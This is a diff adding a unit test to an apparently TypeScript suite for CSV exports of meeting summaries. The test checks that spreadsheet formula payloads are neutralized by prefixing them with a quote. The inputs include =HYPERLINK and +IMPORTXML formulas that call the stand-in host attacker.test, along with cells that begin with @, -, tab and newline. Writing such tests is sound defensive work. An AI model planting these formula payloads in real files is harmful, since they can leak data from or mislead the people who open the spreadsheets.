@@ -45,6 +45,42 @@ describe("reporter exports", () => {
 		expect(csv).not.toContain("subscription-secret");
 	});
 
+	it("neutralizes spreadsheet formulas in CSV cells", () => {
+		const csv = buildReporterCsv({
+			...reporterMeeting,
+			title: '=HYPERLINK("https://attacker.test","click")',
+			summary: {
+				...reporterMeeting.summary,
+				executiveSummary: '+IMPORTXML("https://attacker.test", "//x")',
+				keyDecisions: [
+					{
+						title: "@formula",
+						description: "-dangerous",
+						topics: ["\tbudget"],
+					},
+				],
+				discussionTopics: [
+					{
+						topic: "\rtopic",
+						summary: "\nsummary",
+						category: "=category",
+					},
+				],
+			},
+		});
+
+		expect(csv).toContain(
+			'"\'=HYPERLINK(""https://attacker.test"",""click"")"',
+		);
+		expect(csv).toContain('"\'+IMPORTXML(""https://attacker.test"", ""//x"")"');
+		expect(csv).toContain('"\'@formula"');
+		expect(csv).toContain('"\'-dangerous"');
+		expect(csv).toContain('"\'\tbudget"');
+		expect(csv).toContain('"\'\rtopic"');
+		expect(csv).toContain('"\'\nsummary"');
+		expect(csv).toContain('"\'=category"');
+	});
+
 	it("builds stable export filenames", () => {
 		expect(buildReporterExportFilename(reporterMeeting, "md")).toBe(
 			"coventry-town-council-regular-meeting-2026-06-15.md",
